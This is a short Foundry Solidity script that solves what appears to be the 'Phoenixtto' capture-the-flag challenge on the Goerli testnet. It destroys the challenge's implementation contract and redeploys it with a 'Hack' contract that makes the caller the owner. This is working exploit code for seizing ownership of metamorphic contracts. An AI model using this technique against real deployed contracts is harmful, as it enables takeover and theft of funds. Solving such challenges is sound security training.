// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/ChallengePhoenixtto.sol";

contract Hack {
    address public owner;

    function reBorn() external {
        owner = tx.origin;
    }
}

// https://goerli.etherscan.io/address/0x286C393f8AAE3fA1ac120B187919a1913b330136
contract ChallengePhoenixttoScript is Script {
    address constant instance = 0x286C393f8AAE3fA1ac120B187919a1913b330136;

    function run() public {
        vm.startBroadcast();

        Laboratory lab = Laboratory(instance);
        Phoenixtto phoenixtto = Phoenixtto(lab.addr());

        // destroy implementation
        phoenixtto.capture("foo");

        // reborn with hacked implementation
        lab.reBorn(type(Hack).creationCode);

        console.log("isCaught", lab.isCaught());
    }
}
